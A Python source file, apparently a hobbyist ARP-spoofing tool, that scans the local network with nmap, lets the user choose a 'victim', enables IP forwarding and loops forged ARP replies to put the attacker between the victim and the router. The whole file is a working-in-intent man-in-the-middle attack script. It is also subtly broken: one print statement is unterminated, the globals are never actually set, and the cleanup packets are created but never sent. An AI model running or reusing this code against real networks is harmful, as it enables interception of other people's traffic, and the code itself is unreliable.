import New_Nscanner as scanner
import scapy.all as scapy
import time
import os
import subprocess
import re

victim_ip=None
victim_mac=None
router_ip=None
attacker_ip=None
router_mac=None


def intel_gathering():



    # it is a system command to get information
    call_output = subprocess.check_output(
        ["ip", "route", "get", "1.1.1.1"], universal_newlines=True)

    # regex formula to find ip address "([0-9]+\.[0-9]+\.[0-9]+\.[0-9])+"
    ip_found = re.findall(r"([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)", call_output)

    # regex formula to find mac addresses r"dev\s[a-zA-Z0-9"
    working_interface = re.findall(r"dev\s[a-zA-Z0-9]*", call_output)
    working_interface = working_interface[0].replace("dev ", "")

    # the 2nd element of the search result is router ip
    

    router_ip = ip_found[1]

    # the 3rd element of the search result is attaker ip
    

    attacker_ip = ip_found[2]

    print(f"----{router_ip}----is Your Router Ip \n----{attacker_ip}---- is Attacker IP or Your IP )
    print(f"----{working_interface}----is your Currently Working interface")

    # nmap scanning is called
    scan_result = scanner.nmap_scan(f"{router_ip}/24")

    # To set ip_forward as true
    os.system("sudo echo 1 > /proc/sys/net/ipv4/ip_forward")

    victim_ip = None

    # If Victim IP address is known
    victim_ip = str(
        input("> Enter the Victim ip(if You Dont Know Leave it blank):"))
    if victim_ip:
        for i in range(len(scan_result)):
                if scan_result[i]["ip"] == victim_ip:
                    victim_mac=scan_result[i]["mac"]
                    break

    # If victim IP is not known
    if not victim_ip:
        for i in range(len(scan_result)):

            # To remove the router and attacker in the victim ip list
            if scan_result[i]["ip"] == router_ip or scan_result[i]["ip"] == attacker_ip:

                # To Get the Router mac address
                if scan_result[i]["ip"] == router_ip:
                    
                    router_mac = scan_result[i]["mac"]

                # to remove the consideration of the router and attaker ip
                continue

                # If you wanna know the imformation of router and attaker from nmap remove # from below lines
                # print(scan_result[i])
                #print(f"-----ROUTER-----\nIP address : {scan_result[i]['ip']}\nMac Address:{scan_result[i]['mac']}\nDevice Name:{scan_result[i]['name']}")

            # To print victim ip
            print(f"[{i+1}]IP address : {scan_result[i]['ip']}\tMac Address:{scan_result[i]['mac']}\tDevice Name:{scan_result[i]['name']}")

        # to set the pointer to choose victim
        try:
            pointer = (int(input("> choose any One Above :"))-1)
        except:
            print("Enter a Valid Choice")

        

        victim_ip = scan_result[pointer]["ip"]
        victim_mac = scan_result[pointer]["mac"]
def Spoofer():

    
    try:
        # To count no of packets send packet
        

        # Creating a instance To Send ARP to response to victim as we are a routers
        atk_victim = scapy.ARP(op=2, hwdst=victim_mac,pdst=victim_ip, psrc=router_ip)

        # Creating a instance To Send ARP to response to router as we are a victim
        atk_router = scapy.ARP(op=2, hwdst=router_mac,pdst=router_ip, psrc=victim_ip)

        # To Send the Instance Created
        scapy.send(atk_victim, verbose=False)
        scapy.send(atk_router, verbose=False)

        
        print(F"\r[*] Sent {packet_counter} Packets", end="")
        time.sleep(1)

    except KeyboardInterrupt:

        #To turn off the IP Forward
        os.system("sudo echo 0 > /proc/sys/net/ipv4/ip_forward")

        print("\n[+] Setting The ARP table back As it was.\n")

        # Creating a instance To Send ARP to response to victim as we are a routers
        atk_victim = scapy.ARP(op=2, hwdst=victim_mac,pdst=victim_ip, psrc=router_ip,hwsrc=router_mac)

        # Creating a instance To Send ARP to response to router as we are a victim
        atk_router = scapy.ARP(op=2, hwdst=router_mac,pdst=router_ip, psrc=victim_ip,hwsrc=victim_mac)

        print("\nI Got Interupted :(    Good Bye\n")

        quit()

if __name__ == "__main__":  # To use this code as a module

    
    #Function Call
    intel_gathering()

    packet_counter = 2
    
    #Function Call
    while True:
        Spoofer()
        packet_counter += 2

